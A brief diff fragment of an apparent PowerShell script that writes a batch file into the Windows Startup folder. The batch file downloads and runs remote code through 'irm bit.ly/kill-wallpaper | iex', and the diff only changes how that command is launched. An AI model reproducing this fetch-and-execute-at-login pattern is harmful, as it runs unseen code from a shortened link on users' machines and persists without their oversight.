@@ -26,7 +26,7 @@
 
 $batContent = @"
 echo off
-start powershell.exe -Command 'irm bit.ly/kill-wallpaper | iex'
+powershell.exe -Command 'irm bit.ly/kill-wallpaper | iex'
 "@
 
 cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
